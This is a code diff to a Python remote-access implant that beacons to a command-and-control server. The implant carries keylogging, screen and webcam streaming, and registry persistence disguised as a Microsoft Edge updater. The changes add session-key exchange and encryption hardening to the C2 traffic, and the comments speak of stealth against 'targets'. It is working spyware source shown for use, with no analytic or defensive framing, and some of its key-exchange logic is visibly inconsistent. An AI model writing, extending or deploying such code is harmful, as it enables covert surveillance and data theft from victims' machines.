@@ -8,6 +8,7 @@ import json
 import time
 import base64
 import random
+import platform
 import threading
 import subprocess
 import zlib
@@ -23,6 +24,8 @@ import pyaudio
 import wave
 import keyboard
 import numpy as np
+import hashlib
+import secrets
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -44,6 +47,16 @@ shell_output_queue = queue.Queue()
 MAX_CHUNK_SIZE = 1024 * 1024 
 MAX_PENDING_RESULTS = 25 
 
+# Derive persistent per-implant base key from hardware ID (never changes)
+def derive_implant_key():
+    base = implant_id.encode('utf-8')  # Already unique from MachineGuid/UUID
+    return hashlib.sha256(base + b"LOCUST_IMP_KEY").digest()  # 32-byte key
+
+IMPLANT_BASE_KEY = derive_implant_key()
+
+# Ephemeral session key (refreshed periodically)
+session_key = None
+session_key_expiry = 0
 
 
 BEACON_KEY = b"0123456789abcdef0123456789abcdef"  # 32-byte key, match server
@@ -56,17 +69,38 @@ USER_AGENTS = [
 ]
 # ================================================
 
-aesgcm = AESGCM(BEACON_KEY)
+# ENCRYPTION HARDENED
+session_key_proposed = secrets.token_bytes(32)
+
+
+def get_session_key():
+    global session_key, session_key_expiry
+    now = time.time()
+    if session_key is None or now > session_key_expiry:
+        # Generate new session key + 24h expiry
+        session_key = secrets.token_bytes(32)
+        session_key_expiry = now + 86400  # 24 hours
+        print(f"[+] New session key generated (expires in 24h)")
+    return session_key
 
 def encrypt(data: bytes) -> bytes:
-    nonce = os.urandom(12)
+    key = session_key if session_key else BEACON_KEY
+    aesgcm = AESGCM(key)
+    nonce = secrets.token_bytes(12)
     ct = aesgcm.encrypt(nonce, data, None)
     return nonce + ct
 
 def decrypt(data: bytes) -> bytes:
+    key = session_key if session_key else BEACON_KEY
+    aesgcm = AESGCM(key)
     nonce = data[:12]
     ct = data[12:]
-    return aesgcm.decrypt(nonce, ct, None)
+    try:
+        return aesgcm.decrypt(nonce, ct, None)
+    except:
+        # Fallback to initial if session fails
+        aesgcm = AESGCM(BEACON_KEY)
+        return aesgcm.decrypt(nonce, ct, None)
 
 def get_jittered_sleep():
     jitter = SLEEP_BASE * (JITTER_PCT / 100.0)
@@ -93,7 +127,7 @@ def generate_implant_id():
 
 def establish_persistence():
     script_path = os.path.abspath(__file__)
-    persist_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Edge", "edgeupd.py")
+    persist_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Edge", "edgeupd.exe")
     if script_path.lower() == persist_path.lower():
         return
     try:
@@ -107,6 +141,7 @@ def establish_persistence():
         winreg.CloseKey(key)
     except:
         pass  # silent fail
+
 
 # ===================== TASK HANDLERS =====================
 keylog_buffer = []
@@ -289,45 +324,64 @@ def main():
                 stream_results = [r for r in pending_results if r["output"].startswith(("SCREEN_STREAM_CHUNK:", "WEBCAM_STREAM_CHUNK:"))]
                 other_results = [r for r in pending_results if not r["output"].startswith(("SCREEN_STREAM_CHUNK:", "WEBCAM_STREAM_CHUNK:"))]
                 pending_results = stream_results[-15:] + other_results[-10:]  # Favor recent stream frames
-
-        payload = {
-            "id": implant_id,
-            "os": "windows",
-            "arch": "amd64",
-            "user": username,
-            "host": hostname,
-            "results": pending_results[:]
-        }
-        try:
-            json_bytes = json.dumps(payload).encode('utf-8')
-            # Compress with maximum compression level
+        
+        # first beacon for key exchange
+        # First beacon: send public session key proposal
+        if session_key is None:  # First beacon - propose key
+            proposal = {
+                "key_exchange": base64.b64encode(session_key_proposed).decode(),
+                "id": implant_id,
+                "host": hostname,
+                "user": username
+            }
+            json_bytes = json.dumps(proposal).encode('utf-8')
             compressed = zlib.compress(json_bytes, level=9)
-
-            # Optional: Add a small header to indicate compression (1 byte flag)
-            # 1 = compressed, 0 = uncompressed
-            final_payload = b"\x01" + compressed
-
-            # Fallback: if compressed is larger (rare), send uncompressed
-            if len(compressed) >= len(json_bytes):
-                final_payload = b"\x00" + json_bytes
-            enc_payload = encrypt(final_payload)
+            payload_to_send = b"\x01" + compressed if len(compressed) < len(json_bytes) else b"\x00" + json_bytes
+            enc_payload = encrypt(payload_to_send)  # Uses BEACON_KEY
             resp = session.post(c2_url, data=enc_payload, headers={"User-Agent": random_ua()}, timeout=30)
+                
             if resp.status_code != 200:
+                session_key = session_key_proposed  # Server accepted implicitly
                 time.sleep(get_jittered_sleep())
                 continue
-            dec_resp = decrypt(resp.content)
-            tasks = json.loads(dec_resp).get("tasks", [])
-            ack_ids = json.loads(dec_resp).get("ack_ids", [])
+        else:
+            # Normal beacon            
+            payload = {
+                "id": implant_id,
+                "os": "windows",
+                "arch": str(platform.architecture()),
+                "user": username,
+                "host": hostname,
+                "results": pending_results[:]
+            }
+            try:
+                json_bytes = json.dumps(payload).encode('utf-8')
+                # Compress with maximum compression level
+                compressed = zlib.compress(json_bytes, level=9)
 
-            # ACK processed results
-            with results_lock:
-                pending_results = [r for r in pending_results if r["task_id"] not in ack_ids]
+                # Optional: Add a small header to indicate compression (1 byte flag)
+                # 1 = compressed, 0 = uncompressed
+                final_payload = b"\x01" + compressed if len(compressed) < len(json_bytes) else b"\x00" + json_bytes
+                
+                enc_payload = encrypt(final_payload)
+                resp = session.post(c2_url, data=enc_payload, headers={"User-Agent": random_ua()}, timeout=30)
+                
+                if resp.status_code != 200:
+                    time.sleep(get_jittered_sleep())
+                    continue
+                dec_resp = decrypt(resp.content)
+                tasks = json.loads(dec_resp).get("tasks", [])
+                ack_ids = json.loads(dec_resp).get("ack_ids", [])
 
-            for task in tasks:
-                threading.Thread(target=handle_task, args=(task,)).start()
+                # ACK processed results
+                with results_lock:
+                    pending_results = [r for r in pending_results if r["task_id"] not in ack_ids]
 
-        except Exception:
-            pass
+                for task in tasks:
+                    threading.Thread(target=handle_task, args=(task,)).start()
+
+            except Exception:
+                pass
         time.sleep(get_jittered_sleep())
 
 # ============== SCREEN STREAM =============
@@ -358,7 +412,7 @@ def screen_stream_worker(duration: int = 0):  # 0 = indefinite
                 pending_results.append(result)
 
             chunk_id += 1
-            time.sleep(0.7)  # ~2 FPS – stealthy bandwidth, stable on low-end targets
+            time.sleep(0.5)  # ~2 FPS – stealthy bandwidth, stable on low-end targets
 
         # Send end marker
         with results_lock:
